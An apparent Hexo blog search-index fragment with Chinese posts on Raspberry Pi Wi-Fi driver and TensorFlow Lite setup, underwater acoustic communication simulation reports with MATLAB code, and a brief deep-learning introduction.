6695d36f04c89be51b84847bbaf21824c30aa2760e82674b8f69c6f501f69ad048ebb8d7872d9a8acb63918779ba7788dd30da5f43a03d4e4dae0a6c83c3cfd746281f5dac6721bee4ad1dd518c6a1bd26e5e228d7c434a95278ba4901c5d8be33af3f87af4407949d4f12194fa86d87e5b38d81092de202cd02dafc825f3259661f1473998fb9d9e422fb93055bbcf21e03f394ee3d4b81d295a74dd7fb3045ef26611558506ca73e4518505c4a769d49f75e596d62d93d6e068a4e82de16c407fee1f87b3c77ff77c01a7fda5677ad2b74a6e9c297969d38ba35f3a3fdc0ed067666c8fa7cbaff85c8c063d47bfd5d1489d67a77061c291d2d6b6e07928774cb9e6b0c8af8bc8ccfa66cce528de08060596d8a2157e85e4f40205547015de3e54ea96b53b0a51390dae93344f505af334a762359e6bda7cff00a663c6285d038a9d1cc4bace16319a0c52a73a91627d5670d3c4c690dd985da541f80b0403f2d1b7472c206b58650470ba8195185bc32689c123cba71639dac27039b68d14fd22d40e5a162d8d81c38dfe7a1b1ee1a295a877f54f69aabe8f0875321f332735e1f98fed3c88d0152173278eac864d49a5122652107769dbe3abfff53ae46a1aefc59828df742d92c96765fc32980bd8e4c8ae4378d9059a9b2a4fdcede77216bea8c9ef0fcb3d7af327eaa2688aa95fe254453a378d5ef1103a299fadc40e9f06ec00bac4ef5194c1c6c2dbf2c2f1e56f56ae8f1499e232c9e54c7bcb13091f0e30b37c0709f6100a0f630edff459c751391307eac15b823fd10702a3b3ec7fbd5002ab83def308721b863119fac89f0026679d950d192c3cfcc8c85dd74c2b4af2eb1f6e89d270437a130ececd7015d1f8f91b86bd679dcb05f7189026f88badc0fdd9d0b999cc09134adf98888f11a0ca5d1b18a63927b9851d4d5166470015e328f0bcc06bd57d51829ca89108856dd71fdc829c8b25263c76a55b2003551be6e3e7e42f802aa1a65dc7505da96e8da0bfd2ade640b79e1adf4ae1567d58aabf18c6346a7c770ad696d8ea3ea739ce701ed0db157bd48cbc88c7118066d24ea654a2cd29795d4497dc3361c2e9e8e54aa24c68876dc6bcc4e06da7072cbd66d54d9daff87183869b74ae55ed6266c27704a7de21ec8f9b9dcf7b84cc2ef7c3b38330a27c04e09ef28cbd28eb6093b9fed613f9875d648968368d4563021eea34fee52d7979940d4ca3f6187f9894fea22e57db5d078101871286e9b79f10ea336aaab9d8101cc5ba0d292ee3fdfca65d56fd5095722b436f14f4e7c41999c60e43860a57b48bad0bca3f8f34f9e95f7baef083831115f5b393cc7e06039c8b9ea784c6cc568f5b7dbf1106ec097fe3491fc8d9bed7c4829343a79d280cf492468307288af6b1306afa47eeecac1b5a86f2b1b455e24654539e2e51c577f34af0b0926d934fa1af83c1ba186294f9b80ff78e7e2c3e011d69e60cf811e1958ee7a5600f1e32699f702fafd7ac0cb5a7ca46154c033f77bd92f1ccb310ab54076f8de57b99be7cbbc7f3ff4001edcca59c228a29ed9a9018d3a0ffc062848cfccde4df2cd01a6f589f2e310f4ffe2fbd729f6b6a672f0403cd1dc36e2a0ff59584353dfe3e5869427234bd5f4d21ef0929f05c695aaf4bf10ccdf25bb20050ed615a97459975ab8ef51a26211a74b8f66c57db2e883868c438d25d35bc678e99a9104c85f70ce4efd3ef074b053df2fd43f7be7320679fbb90690d</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 请输入密码查看更多.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>树莓派</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派3BTL-WN726N驱动</title>
    <url>/2021/04/20/%E6%A0%91%E8%8E%93%E6%B4%BE3BTL-WN726N%E9%A9%B1%E5%8A%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="树莓派3BTL-WN726N驱动"><a href="#树莓派3BTL-WN726N驱动" class="headerlink" title="树莓派3BTL-WN726N驱动"></a>树莓派3BTL-WN726N驱动</h1><h2 id="给树莓派3B装两个网卡"><a href="#给树莓派3B装两个网卡" class="headerlink" title="给树莓派3B装两个网卡"></a>给树莓派3B装两个网卡</h2><ul>
<li>为了得到两条独立的非干扰信道，采用外接usb网卡的形式。</li>
</ul>
<p>但是遇到了一个问题，无线网卡插入树莓派无法识别。于是只好安装驱动，网络上有很多方法，但一点用都没得。</p>
<p>最终只能在树莓派的官方文档中找解决方法<a href="https://www.raspberrypi.org/forums/viewtopic.php?t=62371">教程</a></p>
<p>根据帖子内容，找到自己内核版本对应的驱动</p>
<p><code>3.18.11+ #780, #781 - 8188eu--3.18.3-739.tar.gz</code></p>
<pre class="line-numbers language-none"><code class="language-none">mkdir TP-Link
cd TP-Link
sudo wget http:&#x2F;&#x2F;downloads.fars-robotics.net&#x2F;wifi-drivers&#x2F;8188eu-drivers&#x2F;8188eu-3.18.3-739.tar.gz

tar -zxvf 8188eu-3.18.3-739.tar.gz

mkdir -p &#x2F;lib&#x2F;modules&#x2F;3.18.3+&#x2F;kernel&#x2F;drivers&#x2F;net&#x2F;wireless
sudo vim &#x2F;lib&#x2F;modules&#x2F;3.18.3+&#x2F;modules.order
sudo .&#x2F;install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="对本地网络地址进行配置"><a href="#对本地网络地址进行配置" class="headerlink" title="对本地网络地址进行配置"></a>对本地网络地址进行配置</h2><p>由于在实验室，所用的路由器的端口号是10.xxx.xxx.xxx 然后直接ip连接到了该位置，这肯定有问题。</p>
<pre class="line-numbers language-none"><code class="language-none">sudo nano &#x2F;etc&#x2F;network&#x2F;interfaces<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>修改以下内容设置默认网关，具体数值可以根据自身情况增加</p>
<pre class="line-numbers language-none"><code class="language-none">auto wlan1
iface wlan1 inet dhcp
pre-up wpa_supplicant -Dwext -i wlan0 -c&#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant.conf$


allow-hotplug wlan1
iface wlan1 inet manual
    wpa-conf &#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant.conf
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><pre class="line-numbers language-none"><code class="language-none">sudo depmod -a 
sudo modprobe 8188eu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派4B_tensorflow</title>
    <url>/2021/06/07/%E6%A0%91%E8%8E%93%E6%B4%BE4B-tensorflow/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="树莓派4B-tensorflow"><a href="#树莓派4B-tensorflow" class="headerlink" title="树莓派4B_tensorflow"></a>树莓派4B_tensorflow</h1><h2 id="安装python-virtualenv"><a href="#安装python-virtualenv" class="headerlink" title="安装python virtualenv"></a>安装python virtualenv</h2><ul>
<li>远程ssh登陆操作</li>
</ul>
<p><code>ping raspberrypi.local</code></p>
<ul>
<li>获取树莓派的内网ip，我的是 192.168.1.6，ssh登陆并输入密码：</li>
</ul>
<p><code>ssh pi@192.168.1.6</code></p>
<ul>
<li>安装Python</li>
</ul>
<p><code>python --version</code></p>
<pre class="line-numbers language-none"><code class="language-none"># 安装venv
$ sudo pip3 install virtualenv virtualenvwrapper

# （可选）为了尽快下载，可以用国内镜像下载
$ sudo pip3 install -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple virtualenv virtualenvwrapper 


# 查看版本
$ virtualenv --version
16.7.7


# 新建测试目录
$ mkdir venvtest &amp;&amp; cd venvtest

# 安装python的隔离环境，python相关目录放在ENV文件夹
$ virtualenv ENV
Using base prefix &#39;&#x2F;usr&#39;
New python executable in &#x2F;home&#x2F;pi&#x2F;venvtest&#x2F;ENV&#x2F;bin&#x2F;python3
Also creating executable in &#x2F;home&#x2F;pi&#x2F;venvtest&#x2F;ENV&#x2F;bin&#x2F;python
Installing setuptools, pip, wheel...
done.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="安装TensorFlow-Lite"><a href="#安装TensorFlow-Lite" class="headerlink" title="安装TensorFlow Lite"></a>安装TensorFlow Lite</h2><p>从github下载pi4b_tensorflow_lite<br><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;whgreate&#x2F;pi4b_tensorflow_lite
# 安装tensorflow lite
$ pip install tflite_runtime-1.14.0-cp37-cp37m-linux_armv7l.whl 

Looking in indexes: https:&#x2F;&#x2F;pypi.org&#x2F;simple, https:&#x2F;&#x2F;www.piwheels.org&#x2F;simple
Processing .&#x2F;tflite_runtime-1.14.0-cp37-cp37m-linux_armv7l.whl
Installing collected packages: tflite-runtime
Successfully installed tflite-runtime-1.14.0

# numpy pillow库需要的一些依赖
$ sudo apt-get install libatlas-base-dev
$ sudo apt-get install libjpeg-dev

# 安装 numpy pillow
$ pip install -r requirements.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="进行测试"><a href="#进行测试" class="headerlink" title="进行测试"></a>进行测试</h2><p>运行图像分类模型<br>选取TensorFlow Example的图片，执行以下命令：<br><pre class="line-numbers language-none"><code class="language-none">python label_image.py -m mobilenet_v1_1.0_224_quant.tflite -l labels_mobilenet_quant_v1_224.txt -i grace_hopper.bmp


INFO: Initialized TensorFlow Lite runtime.
0.658824: military uniform
0.149020: Windsor tie
0.039216: bow tie
0.027451: mortarboard
0.019608: bulletproof vest
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>用摄像头拍摄一张照片进行测试：<br><pre class="line-numbers language-none"><code class="language-none">raspistill -o demo.jpg


python label_image.py -m mobilenet_v1_1.0_224_quant.tflite -l labels_mobilenet_quant_v1_224.txt -i demo.jpg


0.266667: barbershop
0.098039: potter&#39;s wheel
0.050980: laptop
0.043137: barber chair
0.043137: shoe shop

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
]]></content>
      <categories>
        <category>研究生课程</category>
      </categories>
      <tags>
        <tag>研究生课程</tag>
        <tag>matlab</tag>
        <tag>水声通信</tag>
      </tags>
  </entry>
  <entry>
    <title>水声通信实验课程作业</title>
    <url>/2020/11/17/%E6%B0%B4%E5%A3%B0%E9%80%9A%E4%BF%A1%E8%AF%BE%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="水声通信仿真报告"><a href="#水声通信仿真报告" class="headerlink" title="水声通信仿真报告"></a><center>水声通信仿真报告</center></h1><h2 id="Underwater-acoustic-communication-Simulation-report"><a href="#Underwater-acoustic-communication-Simulation-report" class="headerlink" title="Underwater acoustic communication Simulation report"></a><center>Underwater acoustic communication Simulation report</center></h2><h2 id="1-水声通信仿真模型"><a href="#1-水声通信仿真模型" class="headerlink" title="1.水声通信仿真模型"></a>1.水声通信仿真模型</h2><center>

<img src="https://www.codekp.cn/download/img/underwater/mode.jpg" width = "681" height = "302" alt="图片名称" align=center />

&nbsp;

 图一、水声通信仿真模型</center> 
<span id="more"></span>
&nbsp;


## 2.调制方法及信道设置
要求：MFSK、带宽20kHz-30kHz、采样率80kHz、通信速率2kbps。

### 2.1调制方式设置

1. 4FSK

      采用4FSK调制方式，码元速率为1000波特，通信速率为2kbps。码元宽度为1ms，其中保护间隔为0.2ms，采样频率为80KHz。选取的载波频率为12kHz、19kHz、25kHz和32kHz，通信带宽约为20kHz。

2. 8FSK  
      采用8FSK调制方式，码元速率为1000波特，通信速率为2kbps。码元宽度为1ms，其中保护间隔为0.2ms，采样频率为80KHz。。码元结构为LFM同步信号-信息码元-LFM同步信号。选取的载波频率为12kHz、15kHz、18kHz、21kHz、24kHz、27kHz、30kHz和32kHz，通信带宽约为20kHz。
### 2.2信道设置
1. 莱斯信道

      莱斯信道：采样频率选取80Khz，由于水声信道衰弱可以暂时简化，只考虑五条路径，路径长度假设为[100,115,130,160,220,250]。由于水下声速大概为1450-1540m/s,因此相较于直线传播的时延设置为[0 15 30 60 120 150]/1.5e3。

      信道增益设置为 [0 -10 -13 -15 -18 -22]。k=5 莱斯信道K-factor ,k为标量的时候第一条路径服从莱斯分布,其余路径服从瑞利分布。

      采用Matlab自带函数构造莱斯信道：

     <center> chan = ricianchan(Ts,fD,k,pathDelays, avgPathGains);</center> 

<ol>
<li><p>瑞利信道</p>
<p>   瑞利信道：采样频率选取80Khz，由于水声信道衰弱可以暂时简化，只考虑五条路径，路径长度假设为[100,115,130,160,220,250]。由于水下声速大概为1450-1540m/s,因此相较于直线传播的时延设置为[0 15 30 60 120 150]/1.5e3。</p>
<p>   信道增益设置为[0 -10 -13 -15 -18 -22]。</p>
<p>   采用Matlab自带函数构造瑞利信道：</p>
</li>
</ol>
<center>chan = rayleighchan(Ts, fD, pathDelays, avgPathGains);</center> 

<ol>
<li><p>高斯信道</p>
<p>高斯信道即为恒参信道，即信号通过信道后叠加一个高斯噪声，其中k为信噪比单位为dB，如下所示：</p>
</li>
</ol>
<center>y2=awgn(y1,snr(k),'measured');</center>

<h2 id="3-仿真结果"><a href="#3-仿真结果" class="headerlink" title="3.    仿真结果"></a>3.    仿真结果</h2><ol>
<li>4FSK、8FSK在高斯信道、瑞利信道和莱斯信道，不同信噪比下的误码率：</li>
</ol>
<center>
<img src="https://mmrslwan1110.github.io/download/img/underwater/4FSK.png" width = "400" height = "350" alt="图片名称" align=center />

a.4FSK不同信道下误码性能对比 

<img src="https://mmrslwan1110.github.io/download/img/underwater/8FSK.png" width = "400" height = "350" alt="图片名称" align=center />

b.8FSK不同信道下误码性能对比</center>

<ol>
<li>4FSK、8FSK在 [-10,10]噪声强度下的平均误码率对比 <center>

</li>
</ol>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">信道</th>
<th style="text-align:right">4FKS</th>
<th style="text-align:left">8FSK</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">高斯信道误码率</td>
<td style="text-align:right">0.0425</td>
<td style="text-align:left">0.0.452</td>
</tr>
<tr>
<td style="text-align:center">瑞利信道误码率</td>
<td style="text-align:right">0.1201</td>
<td style="text-align:left">0.1609</td>
</tr>
<tr>
<td style="text-align:center">莱斯信道误码率</td>
<td style="text-align:right">0.0764</td>
<td style="text-align:left">0.1144</td>
</tr>
</tbody>
</table>
</div>
<p>&lt;/center&gt;</p>
<h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><ol>
<li>4FSK在莱斯信道中传播误码率相比8FSK降低了7.4%。</li>
<li>4FSK在瑞利信道中传播误码率相比8FSK降低了21.07%。</li>
<li>4FSK在高斯信道中传播误码率相比8FSK降低了20.2%。</li>
</ol>
<h4 id="通过仿真结果可以看出，误码率随着信噪比的升高而降低，与符合理论计算值。实验中加入了保护间隔，序列长度为1000。"><a href="#通过仿真结果可以看出，误码率随着信噪比的升高而降低，与符合理论计算值。实验中加入了保护间隔，序列长度为1000。" class="headerlink" title="通过仿真结果可以看出，误码率随着信噪比的升高而降低，与符合理论计算值。实验中加入了保护间隔，序列长度为1000。"></a>通过仿真结果可以看出，误码率随着信噪比的升高而降低，与符合理论计算值。实验中加入了保护间隔，序列长度为1000。</h4><h2 id="结论："><a href="#结论：" class="headerlink" title="结论："></a>结论：</h2><ol>
<li>4FSK在相同信噪比时，不论是在高斯信道、瑞利信道还是莱斯信道误码率都要小于8FSK，说明4FSK相比8FSK的抗噪性能会更好。</li>
<li>同样的信噪比下不论是通过4FSK还是8FSK调制，高斯信道的误码率要小于莱斯信道小于瑞利信道。</li>
</ol>
<p><a href="/download/水声通信实时抗干扰实验.pdf&quot;">点击下载PDF文档</a></p>
<p><a href="/download/MFSK代码.zip&quot;">code_download</a></p>
<p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>
<h1 id="水声通信冲激响应"><a href="#水声通信冲激响应" class="headerlink" title="水声通信冲激响应"></a><center>水声通信冲激响应</center></h1><h2 id="Underwater-acoustic-communication-impulse-response"><a href="#Underwater-acoustic-communication-impulse-response" class="headerlink" title="Underwater acoustic communication impulse response"></a><center>Underwater acoustic communication impulse response</center></h2><h2 id="1-通过MATLAB进行仿真"><a href="#1-通过MATLAB进行仿真" class="headerlink" title="1. 通过MATLAB进行仿真"></a>1. 通过MATLAB进行仿真</h2><p>水声信道可以用瑞利信道进行模拟：</p>
<p>水下声速：1500m/s                       多径长度：[100 115 130 160 220 250] (m)</p>
<center>

<img src="https://mmrslwan1110.github.io/download/img/underwater/impulseResponse.png" width = "400" height = "400" alt="图片名称" align=center />


图1冲激响应仿真</center>

<ul>
<li>程序：<pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">fs &#x3D; 8e4;        %采样频率                           % Hz
pathDelays &#x3D; [0 15 30 60 120 150]&#x2F;1.5e3;   %设收发距离为100m,声速1500m&#x2F;s
avgPathGains &#x3D; [0 -10 -13 -15 -18 -22];%信道增益
fD &#x3D; 30;     %最大多普勒频移
rchan &#x3D; comm.RayleighChannel(&#39;SampleRate&#39;,fs, ...
    &#39;PathDelays&#39;,pathDelays, ...
    &#39;AveragePathGains&#39;,avgPathGains, ...
    &#39;MaximumDopplerShift&#39;,fD, ...
    &#39;Visualization&#39;,&#39;Impulse and frequency responses&#39;);
x &#x3D; randi([0 1],1000,1);
y &#x3D; rchan(x);
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="2-文献调研的实际冲激响应"><a href="#2-文献调研的实际冲激响应" class="headerlink" title="2.    文献调研的实际冲激响应"></a>2.    文献调研的实际冲激响应</h2></li>
</ul>
<center>
<img src="https://mmrslwan1110.github.io/download/img/underwater/wuyuanwan1.png" width = "340" height = "300" alt="图片名称" align=center />

<img src="https://mmrslwan1110.github.io/download/img/underwater/wuyuanwan2.png" width = "340" height = "300" alt="图片名称" align=center />

<img src="https://mmrslwan1110.github.io/download/img/underwater/wuyuanwan3.png" width = "340" height = "300" alt="图片名称" align=center />



&nbsp;
图2 五缘湾水声通信采集的冲激响应
</center>

<p><center><br><img src="https://mmrslwan1110.github.io/download/img/underwater/haiyangresponse.png" width = "340" height = "300" alt="图片名称" align=center /></p>
<p>图3 实际海洋信道冲激响应<br>&lt;/center&gt;<br>&nbsp;<br>参考文献：</p>
<p>[1]陈友淦,许肖梅,张兰,林梅英.浅海水声信道模型差异对纠错码性能分析的影响[J].兵工学报,2013,34(11):1404-1411.</p>
<p>[2]裴月华,苏为,陶金成,江霞林. 一种时变海洋信道建模方法[J]. 系统仿真学报,,:1-9.</p>
<p><a href="/download/水声通信冲激响应.pdf&quot;">点击下载PDF文档</a></p>
<p><a href="/download/冲激响应代码.zip&quot;">code_download</a></p>
]]></content>
      <categories>
        <category>研究生课程</category>
      </categories>
      <tags>
        <tag>研究生课程</tag>
        <tag>matlab</tag>
        <tag>水声通信</tag>
      </tags>
  </entry>
  <entry>
    <title>水声通信课程作业业_二</title>
    <url>/2020/12/04/%E6%B0%B4%E5%A3%B0%E9%80%9A%E4%BF%A1%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A%E4%B8%9A-%E4%BA%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="LMS和RLS算法的性能对比"><a href="#LMS和RLS算法的性能对比" class="headerlink" title="LMS和RLS算法的性能对比"></a><center>LMS和RLS算法的性能对比</center></h1><p><strong><center>Performance comparison of LMS and RLS algorithms</center></strong></p>
<h2 id="1-仿真模型"><a href="#1-仿真模型" class="headerlink" title="1.  仿真模型"></a>1.  <strong>仿真模型</strong></h2><p><img src="https://www.codekp.cn/download/img/水声通信/model.JPG" width = "681" height = "302" alt="图片名称" align=center /></p>
<p>图一、水声通信仿真模型</p>
<h2 id="2-调制方式及信道设置"><a href="#2-调制方式及信道设置" class="headerlink" title="2.  调制方式及信道设置"></a>2.  <strong>调制方式及信道设置</strong></h2><p>要求：调制方式QPSK、序列长度2048、训练序列长度1024、信噪比范围5-20dB，比较LMS和RLS算法的性能，均衡后的均方误差。</p>
<h3 id="2-1调制方式设置"><a href="#2-1调制方式设置" class="headerlink" title="2.1调制方式设置"></a><strong>2.1调制方式设置</strong></h3><p>采用QPSK调制方式，二进制序列长度为2048，二进制转QPSK信号对应如下：</p>
<p><img src="https://www.codekp.cn/download/img/水声通信/公式.JPG" width = "681" height = "302" alt="图片名称" align=center /></p>
<h3 id="2-2信道设置"><a href="#2-2信道设置" class="headerlink" title="2.2信道设置"></a>2.2信道设置</h3><p>根据要求信道设置如下:</p>
<p>H=[1;0;0;0;0.4;0;0;0.2];</p>
<p>可以通过卷积得到调制信号通过信道以后的信号具体如下：</p>
<p>Y=filter(H,1,X);</p>
<p>该信道的冲激响应和阶跃响应为。<br><img src="https://www.codekp.cn/download/img/水声通信/6da051e50a8e5c5add8802dbde95ef38.png" width = "681" height = "302" alt="图片名称" align=center /></p>
<p><img src="https://www.codekp.cn/download/img/水声通信/7886dc3ad17fb9ef1217b82caabe83ff.png" width = "681" height = "302" alt="图片名称" align=center /></p>
<p>图二、信道的冲击响应和阶跃响应</p>
<h3 id="2-3-LMS和RMS滤波器"><a href="#2-3-LMS和RMS滤波器" class="headerlink" title="2.3.  LMS和RMS滤波器"></a>2.3.  <strong>LMS和RMS滤波器</strong></h3><p>自适应滤波，就是利用前一时刻以获得的滤波器参数的结果，自动的调节现时刻的滤波器参数，以适应信号和噪声未知的或随时间变化的统计特性，从而实现最优滤波。</p>
<p><img src="https://www.codekp.cn/download/img/水声通信/6b2b57f7f72fa7fe7639d96f9fbae2ff.png" width = "681" height = "302" alt="图片名称" align=center /></p>
<p>图三、M个抽头系数的横向滤波器最优权向量</p>
<h4 id="2-3-1-最小均方（LMS）自适应滤波器"><a href="#2-3-1-最小均方（LMS）自适应滤波器" class="headerlink" title="2.3.1 最小均方（LMS）自适应滤波器"></a><strong>2.3.1 最小均方（LMS）自适应滤波器</strong></h4><p>LMS<br>自适应算法是一种特殊的梯度估计，不必重复使用数据，也不必对相关矩阵和互相关矩阵进行运算，只需要在每次迭代时利用输入向量和期望响应，结构简单，易于实现。但LMS<br>收敛速度较慢。</p>
<p>LMS<br>算法的四个性能：一、收敛性；二、收敛速度；三、稳态误差；四、计算复杂度。只有在输入信号具有严格稳定的统计特性时，权向量的优解是不变的。否则，将会随着统计特性的变化而变化。</p>
<p>通过不断调整滤波器的抽头系数，使得权重接近优解。因此自适应算法在平稳条件下的性能表现可以认为是非平稳条件下的一种特殊情况。</p>
<h4 id="2-3-2递推最小二乘（RLS）滤波器"><a href="#2-3-2递推最小二乘（RLS）滤波器" class="headerlink" title="2.3.2递推最小二乘（RLS）滤波器"></a><strong>2.3.2递推最小二乘（RLS）滤波器</strong></h4><p>该算法根据有限个观测数据获取最优解，求出如下图所示的M个抽头系数的横向滤波器最优权向量。递归最小二乘(RLS)算法用迭代算法代替矩阵求逆达到降低运算量的目的。</p>
<h2 id="3-仿真结果"><a href="#3-仿真结果" class="headerlink" title="3.  仿真结果"></a>3.  <strong>仿真结果</strong></h2><h3 id="3-1-QPSK复数调制和载波调制在RLS、LMS，不同信噪比下的均方误差："><a href="#3-1-QPSK复数调制和载波调制在RLS、LMS，不同信噪比下的均方误差：" class="headerlink" title="3.1.  QPSK复数调制和载波调制在RLS、LMS，不同信噪比下的均方误差："></a>3.1.  <strong>QPSK复数调制和载波调制在RLS、LMS，不同信噪比下的均方误差：</strong></h3><p><img src="https://www.codekp.cn/download/img/水声通信/03e265980d3ebcc5f87a37a2f2412168.png" alt=""></p>
<p><img src="https://www.codekp.cn/download/img/水声通信/0191fa535267c3bb1f1ea68d234d09ac.png" alt=""></p>
<ol>
<li><p>复数调制通过RMS、LMS均方误差 b. 载波调制通过RMS、LMS均方误差</p>
</li>
<li><p><strong>复数调制、载波调制在 [5,20]噪声强度下的平均误码率对比</strong></p>
</li>
</ol>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>复数调制</th>
<th>载波调制</th>
</tr>
</thead>
<tbody>
<tr>
<td>不经过均衡</td>
<td>0.5544</td>
<td>0.4124</td>
</tr>
<tr>
<td>LMS算法</td>
<td>0.5205</td>
<td>0.3872</td>
</tr>
<tr>
<td>RMS算法</td>
<td>0.5148</td>
<td>0.3820</td>
</tr>
</tbody>
</table>
</div>
<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a><strong>分析：</strong></h3><p>1、QPSK复数调制后通过RLS算法相比LMS算法、不经过均衡，均方误差分别降低1.10%、7.14%。</p>
<p>2、QPSK载波调制后通过RLS算法相比LMS算法、不经过均衡，均方误差分别降低1.26%、7.37%。</p>
<p>3、RMS算法的均方误差优于LMS算法的均方误差优于不经过均衡。</p>
<p>通过仿真结果可以看出，均方误差随着信噪比的升高而降低，与理论计算值相符。</p>
<h2 id="结论："><a href="#结论：" class="headerlink" title="结论："></a><strong>结论：</strong></h2><p><strong>在QPSK信号调制中RMS算法性能优于LMS算法性能，即RMS算法均衡后的均方误差小于LMS算法均衡后的均方误差。</strong></p>
<p><a href="/download/LMS和RLS算法的性能对比.pdf">点击下载PDF文档</a></p>
<p><a href="/download/LMS和RLS.zip">code_download</a></p>
]]></content>
      <categories>
        <category>研究生课程</category>
      </categories>
      <tags>
        <tag>研究生课程</tag>
        <tag>matlab</tag>
        <tag>水声通信</tag>
      </tags>
  </entry>
  <entry>
    <title>深度学习_花书</title>
    <url>/2020/07/30/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-%E8%8A%B1%E4%B9%A6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="深度学习"><a href="#深度学习" class="headerlink" title="深度学习"></a>深度学习</h1><span id="more"></span>
<p>&nbsp;&nbsp; 深度学习(DL, Deep Learning)是机器学习(ML, Machine Learning)领域中一个新的研究方向，它被引入机器学习使其更接近于最初的目标——人工智能(AI, Artificial Intelligence)。<br>&nbsp;&nbsp; 深度学习是学习样本数据的内在规律和表示层次，这些学习过程中获得的信息对诸如文字，图像和声音等数据的解释有很大的帮助。它的最终目标是让机器能够像人一样具有分析学习能力，能够识别文字、图像和声音等数据。 深度学习是一个复杂的机器学习算法，在语音和图像识别方面取得的效果，远远超过先前相关技术。<br>&nbsp;&nbsp; 深度学习在搜索技术，数据挖掘，机器学习，机器翻译，自然语言处理，多媒体学习，语音，推荐和个性化技术，以及其他相关领域都取得了很多成果。深度学习使机器模仿视听和思考等人类的活动，解决了很多复杂的模式识别难题，使得人工智能相关技术取得了很大进步。  </p>
]]></content>
      <categories>
        <category>研究生课程</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
        <tag>分类器</tag>
      </tags>
  </entry>
  <entry>
    <title>百度谷歌搜索引擎索引</title>
    <url>/2020/12/04/%E7%99%BE%E5%BA%A6%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%8B%97%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%B4%A2%E5%BC%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="百度谷歌搜索引擎索引"><a href="#百度谷歌搜索引擎索引" class="headerlink" title="百度谷歌搜索引擎索引"></a><center>百度谷歌搜索引擎索引</center></h2><span id="more"></span>
<h3 id="简单检索"><a href="#简单检索" class="headerlink" title="简单检索"></a>简单检索</h3><p>参考<a href="https://jingyan.baidu.com/article/6b97984dee19b81ca3b0bf4c.html">如何让自己的网站快速被百度收录</a></p>
<ol>
<li>提交链接。</li>
</ol>
<ul>
<li>Google: <a href="http://www.google.com/addurl/?hl=zh-CN">Google 网站站长工具</a></li>
<li>Baidu: <a href="https://ziyuan.baidu.com/linksubmit/url">url提交_站长工具</a></li>
</ul>
<ol>
<li>最有用的方法</li>
</ol>
<ul>
